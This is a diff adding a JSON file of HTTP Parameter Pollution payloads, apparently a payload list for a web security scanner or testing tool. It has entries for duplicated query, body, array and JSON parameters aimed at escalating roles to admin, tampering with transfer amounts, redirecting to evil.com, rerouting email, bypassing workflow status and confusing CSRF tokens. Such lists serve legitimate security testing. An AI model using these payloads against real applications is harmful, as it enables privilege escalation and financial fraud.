@@ -1,0 +1,47 @@
+{
+  "category": "hpp",
+  "contexts": {
+    "query": {
+      "description": "HTTP Parameter Pollution via query string duplication",
+      "payloads": [
+        {"payload": "?param=legitimate&param=injected", "description": "Duplicate query parameter - second may override first depending on server", "waf_bypass": false},
+        {"payload": "?param=injected&param=legitimate", "description": "Duplicate parameter with injected value first", "waf_bypass": false},
+        {"payload": "?role=user&role=admin", "description": "Role parameter pollution to escalate privileges", "waf_bypass": false},
+        {"payload": "?redirect=safe.com&redirect=evil.com", "description": "Redirect parameter pollution for open redirect", "waf_bypass": false}
+      ]
+    },
+    "body": {
+      "description": "HTTP Parameter Pollution in POST body parameters",
+      "payloads": [
+        {"payload": "amount=100&amount=0.01", "description": "Amount parameter pollution - backend may use first, WAF/validator last", "waf_bypass": false},
+        {"payload": "to=victim@example.com&to=attacker@example.com", "description": "Email destination pollution for CC injection", "waf_bypass": false},
+        {"payload": "status=pending&status=approved", "description": "Status field pollution for workflow bypass", "waf_bypass": false }
+      ]
+    },
+    "mixed": {
+      "description": "HPP using both query string and body to confuse parameter parsing",
+      "payloads": [
+        {"payload": "GET /transfer?amount=1 with body: amount=1000000", "description": "Split amount between URL and body for parser confusion", "waf_bypass": false},
+        {"payload": "GET /action?admin=false with body: admin=true", "description": "Admin flag split between URL query and body", "waf_bypass": false},
+        {"payload": "URL: ?csrf_token=valid_token and body: csrf_token=attacker_token", "description": "CSRF token confusion via split parameter", "waf_bypass": false}
+      ]
+    },
+    "array": {
+      "description": "HPP via array-style parameter naming",
+      "payloads": [
+        {"payload": "?param[]=value1&param[]=value2", "description": "Array-style parameter injection (PHP/Ruby)", "waf_bypass": false},
+        {"payload": "?param[0]=legitimate&param[1]=injected", "description": "Indexed array parameter pollution", "waf_bypass": false},
+        {"payload": "?ids[]=1&ids[]=2&ids[]=3", "description": "Array of IDs for IDOR via HPP", "waf_bypass": false},
+        {"payload": "?role[]=user&role[]=admin", "description": "Role array to include admin alongside user", "waf_bypass": false}
+      ]
+    },
+    "json_param": {
+      "description": "HPP-style attacks targeting JSON body parameter handling",
+      "payloads": [
+        {"payload": "{\"role\":\"user\",\"role\":\"admin\"}", "description": "Duplicate JSON key - behavior depends on parser (last-wins vs first-wins)", "waf_bypass": false},
+        {"payload": "{\"amount\":\"1000000\",\"amount\":\"1\"}", "description": "Duplicate amount key in JSON body", "waf_bypass": false},
+        {"payload": "{\"admin\":false,\"admin\":true}", "description": "Duplicate admin boolean key", "waf_bypass": false}
+      ]
+    }
+  }
+}
